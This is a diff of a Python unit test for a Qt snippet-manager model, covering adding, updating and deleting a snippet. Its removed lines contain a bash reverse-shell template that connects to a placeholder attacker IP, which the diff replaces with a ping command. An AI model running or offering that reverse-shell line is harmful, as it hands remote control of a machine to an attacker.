@@ -128,18 +128,18 @@ class TestQtModels(unittest.TestCase):
         # Add snippet
         new_snip = {
             "id": "snip_003",
-            "title": "Reverse Shell",
-            "template": "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1",
-            "category": "access",
+            "title": "Network Ping Test",
+            "template": "ping -c 4 {{TARGET_IP}}",
+            "category": "network",
         }
         model.add_snippet(new_snip)
         self.assertEqual(model.rowCount(), 3)
-        self.assertEqual(model.get_snippet_by_id("snip_003")["title"], "Reverse Shell")
+        self.assertEqual(model.get_snippet_by_id("snip_003")["title"], "Network Ping Test")
 
         # Update snippet
-        new_snip["title"] = "Bash Reverse Shell"
+        new_snip["title"] = "Fast Ping Check"
         self.assertTrue(model.update_snippet(new_snip))
-        self.assertEqual(model.get_snippet(0)["title"], "Bash Reverse Shell")
+        self.assertEqual(model.get_snippet(0)["title"], "Fast Ping Check")
 
         # Delete snippet
         self.assertTrue(model.delete_snippet("snip_003"))
